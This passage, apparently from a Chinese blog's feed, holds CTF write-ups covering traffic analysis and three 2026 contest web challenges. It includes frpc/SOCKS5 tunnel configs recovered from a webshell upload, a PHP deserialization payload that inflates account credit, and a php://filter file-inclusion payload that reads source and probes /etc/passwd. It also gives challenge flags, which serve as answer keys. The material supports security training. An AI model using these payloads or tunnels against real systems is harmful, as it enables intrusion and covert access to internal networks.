-当外部网络有人访问 1.2.3.4:6000 时，frps 就会把流量顺着隧道丢给 frpc，frpc 再把流量转发给本机的 22 端口。
-
-
-问 6https://www.nssctf.cn/problem/283
-
-过滤数据包：http.request.uri contains &quot;1.php&quot;
-查看数据包内容，根据 length，一般数值大的，即进行了文件写入操作。
-
-十六进制数，对其进行 Hex 解码，得到 frpc 配置文件的内容。
-
-黑客通过 &#x2F;1.php 上传了frpc.ini文件，里面配置了frpc的参数，里面包含服务端的IP信息。
-flag: NSSCTF{192.168.239.123}
-
-问 7https://www.nssctf.cn/problem/284
-
-黑客通过 &#x2F;1.php 上传了frpc.ini文件，里面配置了socks5代理的参数。
-
-flag：NSSCTF{0HDFt16cLQJ#JTN276Gp}
-Q2：SOCKS5 是什么？1. 定义
-SOCKS5 是一种代理协议（Socket Secure Version 5），工作在会话层。
-SOCKS5 ≠ HTTP代理
-HTTP代理：只支持网页HTTP&#x2F;HTTPS流量
-SOCKS5：几乎所有流量都能转发（TCP绝大多数程序）
-2.  特点
-
-支持 TCP、UDP
-不解读应用层数据（只管转发数据包）
-支持账号密码认证
-可以搭配 FRP、V2Ray、Clash 等工具使用
-本身不加密。原始SOCKS5流量是明文传输；想要加密，一般外面套一层隧道（FRP&#x2F;TLS、ShadowSocks等）。
-
-3. 和 FRP 的结合
-frp 可以直接在客户端配置开启SOCKS5隧道作用：在内网电脑运行frpc，外网通过frps连接这条socks5代理，使用内网机器的网络上网。
-frpc.ini 里 SOCKS5 配置实例
-[common]server_addr = x.x.x.xserver_port = 7000token = 自定义密钥[socks-proxy]type = tcplocal_ip = 127.0.0.1local_port = 1080remote_port = 1080
-
-
-内网本机开启 socks5：127.0.0.1:1080
-外网设备连接 服务器IP:1080流量 → frps → frpc → 内网socks代理 → 使用内网网络
-
-
-另一种：frp内置socks5服务（不用本地额外开socks程序）
-
-[proxy-socks5]type = socks5remote_port = 1080
-
- 4. SOCKS5 常见使用场景
-
-浏览器&#x2F;Clash设置代理，走SOCKS5
-SSH动态端口转发本质就是SOCKS5代理
-FRP内网穿透，对外提供内网代理
-游戏、FTP、远程工具都能使用SOCKS5
-
-
-三、[陇剑杯 2021]简单日志分析问 1https://www.nssctf.cn/problem/285
-
- 在大量 404 响应中出现了一个 500（服务器内部错误），说明该请求触发了服务端异常，这类请求往往对应注入、文件包含等攻击行为。定位到该请求，可从中找到关键字 user
-
-flag：NSSCTF{user}
-
-问 2https://www.nssctf.cn/problem/286
-
-
-发现很像 base64 编码。
-对可疑请求中的字符串做 base64 解码，得到：
-
-flag：NSSCTF{&#x2F;Th4s_IS_VERY_Import_Fi1e}
-
-问 3https://www.nssctf.cn/problem/287
-
-
-base64 解码
-
-flag：NSSCTF{192.168.2.197:8888}
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>Lab-WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>流量分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>御网杯2026 Web部分题解</title>
-    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
-    <content><![CDATA[一、WEB-Snake_Game1. 题目
-
-2. 解题思路
-题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
-F12
-
-
-
-添加覆盖脚本
-
-
-修改成功！
-
-
-拿到 flag
-
-
-二、WEB-PHP_Payment1. 题目
-2. 解题思路
-根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
-
-
-
-下载附件，收集信息
-
-
-代码审计 apply_coupon.php
-1、包含了另外两个文件
-
-2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
-
-如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁 
-再看models.php 里的类
-
-有两个属性，一是代金券金额，一是代金券码。
-含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
-所以，目标就是，构造一个金额够买 Flag
-3、 构造 代金券
-&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
-
-
-TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
-
-
-
-
-
-购买 Flag，看 buy.php
-
-
-
-
-用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
-
-依据这个 调用 fetch 
-fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
-
-拿到 flag
-
-
-三、WEB-Enterprise_OA1. 题目
-
-2. 解题思路
-根据题目提示，这题考查目录穿越、文件包含
-先尝试访问 flag.php
-
-
-include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
-路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
-并且服务器是：
-
-说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
-
-读源代码
-
-
-用 php 伪协议
-php://filter/read=convert.base64-encode/resource=index.php
-
-
-利用 base64 在线解密工具
-PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwMHB4OyBjb2xvcjogIzMzMzsgbGluZS1oZWlnaHQ6IDEuNjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgRW50ZXJwcmlzZSBPQSBTeXN0ZW0KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJuYXYiPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPXB1YmxpY19ub3RpY2VzLnBocCI+Tm90aWNlczwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iP21vZHVsZT1hYm91dC5waHAiPkFib3V0IFVzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWNvbnRhY3QucGhwIj5Db250YWN0PC9hPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQiPgogICAgICAgICAgICA8P3BocCBpbmNsdWRlKCRtb2R1bGUpOyA/PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo= 
-
-
-
-访问绝对路径
-
-
-
-访问 flag 文件
-
-比如：flag.php   flag.txt
-
-
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>Contest-WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
